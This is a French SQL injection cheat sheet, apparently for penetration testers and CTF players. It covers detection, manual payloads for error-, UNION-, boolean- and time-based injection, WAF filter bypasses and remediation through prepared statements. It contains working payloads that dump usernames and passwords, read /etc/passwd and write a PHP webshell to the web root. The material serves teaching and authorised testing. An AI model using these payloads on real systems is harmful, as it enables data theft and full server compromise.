# Injections SQL — théorie et exploitation

Cheat sheet sur la détection, l'exploitation manuelle et la remédiation des injections SQL (SQLi).

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## Méthodologie de détection & fuzzing

### Identification des points d'injection

Le fuzzing consiste à injecter des caractères susceptibles de casser la syntaxe SQL attendue par l'application.

```bash
' ; -- casse une chaîne mal échappée
" ; -- variante avec guillemets doubles (ODBC, certains ORM)
) ; -- casse une clause encapsulée entre parenthèses
; -- teste l'empilement de requêtes (stacked queries)
```

| Caractère | Contexte typique | Effet recherché |
|---|---|---|
| `'` | Chaîne de caractères SQL standard | Erreur de syntaxe si non échappé |
| `"` | Identifiants MySQL, requêtes ODBC | Comportement différent selon le SGBD |
| `)` | Paramètre encapsulé (`WHERE id=(1)`) | Déséquilibre de parenthèses |
| `;` | Séparateur d'instructions | Test d'empilement de requêtes |
| `--` / `#` | Commentaire SQL | Neutralise la fin de la requête originale |

!!! tip "Observer les variations de comportement"
    Comparez systématiquement la réponse pour une valeur légitime, une valeur invalide et une valeur injectée : un changement de taille de réponse, de code HTTP ou de temps de traitement peut trahir une injection silencieuse.

### Diagnostic par messages d'erreur verbeux

| SGBD | Message d'erreur caractéristique |
|---|---|
| MySQL / MariaDB | `You have an error in your SQL syntax; check the manual...` |
| PostgreSQL | `ERROR: unterminated quoted string at or near...` |
| MSSQL | `Unclosed quotation mark after the character string...` |
| Oracle | `ORA-00933: SQL command not properly ended` |

!!! tip "Fingerprinting via l'erreur"
    Le format même du message (`ORA-xxxxx`, `ERROR:`, mention de "manual") permet souvent d'identifier le moteur SQL sans documentation, avant même d'avoir extrait la moindre donnée.

---

## Typologies d'attaques & payloads manuels

### In-Band / Error-Based

Exploite les messages d'erreur du SGBD pour faire fuiter des données directement dans la réponse applicative.

```sql
' AND extractvalue(1, concat(0x7e, (SELECT database()))) -- -
-- Force une erreur XPath contenant le nom de la base (MySQL)

' AND updatexml(1, concat(0x7e, (SELECT user())), 1) -- -
-- Variante avec updatexml, technique équivalente sur MySQL
```

### UNION-Based

Combine le résultat d'une requête injectée avec celui de la requête légitime, via l'opérateur `UNION`.

```sql
' ORDER BY 1-- -              -- Incrémente jusqu'à erreur pour trouver le nombre de colonnes
' ORDER BY 5-- -              -- Erreur ici indique 4 colonnes maximum
' UNION SELECT NULL,NULL,NULL,NULL-- -   -- Confirme le nombre de colonnes
' UNION SELECT 1,2,username,password FROM users-- -   -- Exfiltration réelle
```

!!! tip "Équilibrage des colonnes"
    Le nombre de colonnes du `UNION SELECT` doit correspondre exactement à celui de la requête d'origine, avec des types compatibles colonne par colonne. `NULL` sert souvent de joker universel lors du calibrage.

### Boolean-Based Blind

Utilisée quand aucune donnée ni erreur n'est directement affichée : seule la différence de comportement (page identique vs différente) sert de canal d'exfiltration.

```sql
' AND 1=1-- -      -- Condition vraie : comportement normal
' AND 1=2-- -      -- Condition fausse : comportement différent (référence)
```

```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
-- Teste le premier caractère du mot de passe, à répéter sur chaque position/caractère
```

!!! tip "Déduction caractère par caractère"
    Technique lente manuellement mais parfaitement adaptée à l'automatisation via un script ou `sqlmap`, qui optimise la recherche par dichotomie sur les codes ASCII.

### Time-Based Blind

Utilisée lorsque même la différence de comportement n'est pas observable : on infère la véracité d'une condition via un délai de réponse mesurable.

| SGBD | Payload |
|---|---|
| MySQL / MariaDB | `' AND IF(1=1, SLEEP(5), 0)-- -` |
| PostgreSQL | `' AND (SELECT pg_sleep(5))-- -` |
| MSSQL | `'; IF (1=1) WAITFOR DELAY '0:0:5'-- -` |
| Oracle | `' AND (SELECT CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE 1 END FROM dual)-- -` |

!!! warning "Faux positifs réseau"
    Un délai observé peut aussi provenir de la latence réseau ou d'une charge serveur ponctuelle. Répétez le test avec une condition fausse (délai attendu nul) pour confirmer l'interprétation par le SGBD.

---

## Bypass de filtres & obscurcissement (WAF Bypass)

### Encodage hexadécimal des chaînes

Permet d'éviter les guillemets, souvent filtrés en priorité par les WAF basiques.

```sql
SELECT * FROM users WHERE username = 0x61646d696e
-- Équivalent de WHERE username = 'admin', sans utiliser de guillemets
```

### Espaces alternatifs (whitespace bypass)

| Technique | Exemple |
|---|---|
| Commentaire inline | `UNION/**/SELECT/**/1,2,3` |
| Encodage URL (saut de ligne) | `UNION%0aSELECT%0a1,2,3` |
| Encodage URL (tabulation) | `UNION%09SELECT%091,2,3` |
| Parenthèses (sans espace) | `UNION(SELECT(1),2,3)` |

### Concaténation de fonctions

```sql
' UNION SELECT CONCAT(username,0x3a,password) FROM users-- -
-- Concatène deux colonnes avec ':' encodé en hexadécimal

' UNION SELECT CHAR(97,100,109,105,110)-- -
-- Reconstruit 'admin' via ses codes ASCII
```

!!! tip "Combiner les techniques"
    Un WAF filtrant `UNION SELECT` en clair peut souvent être contourné en combinant plusieurs techniques : commentaires inline, encodage hexadécimal, variation de casse (`UnIoN sElEcT`).

---

## Escalade & impacts réels

### Interrogation des métadonnées système

`information_schema` (MySQL, PostgreSQL, MSSQL) et les vues `sys.*` (MSSQL) exposent la structure complète de la base sans connaissance préalable du schéma.
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
-- Liste l'ensemble des tables accessibles

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
-- Liste les colonnes de la table 'users'

' UNION SELECT name,NULL FROM sys.tables-- -
-- Équivalent MSSQL pour lister les tables
```

### Lecture et écriture de fichiers locaux

!!! warning "Impact système critique"
    Ces primitives dépassent le périmètre de la base et peuvent conduire à une compromission complète du serveur applicatif, notamment via le dépôt d'un webshell.

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
-- Lecture d'un fichier local (nécessite le privilège FILE sous MySQL)

' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
-- Écriture d'un webshell PHP, si le chemin est accessible en écriture par le SGBD
```

---

## Remédiation

!!! warning "La whitelist de caractères ne suffit pas"
    Filtrer ou échapper des caractères spécifiques (`'`, `--`, `;`) reste une défense fragile, contournable comme démontré ci-dessus. La seule protection efficace repose sur la séparation stricte entre code et données.

| Mesure | Principe |
|---|---|
| **Requêtes préparées (Prepared Statements)** | Les paramètres sont transmis séparément de la requête SQL, jamais concaténés dans la chaîne |
| **ORM (Object-Relational Mapping)** | Génère des requêtes paramétrées par construction, réduisant le risque d'erreur humaine |
| **Principe du moindre privilège** | Le compte SGBD applicatif ne doit pas disposer des droits `FILE`, `DROP` ou d'accès à `information_schema` si non nécessaire |
| **WAF** | Mesure de défense en profondeur complémentaire, jamais suffisante seule |

```sql
-- Vulnérable : concaténation directe de l'entrée utilisateur
SELECT * FROM users WHERE username = '" + input + "'

-- Sécurisé : requête préparée, paramètre lié
SELECT * FROM users WHERE username = ?
```

---

## Voir aussi

- OWASP Testing Guide — chapitre injection SQL
- Documentation `sqlmap` pour l'automatisation de la détection et l'exploitation
- Fiche complémentaire : `wireshark.md` pour observer le trafic généré par une exploitation
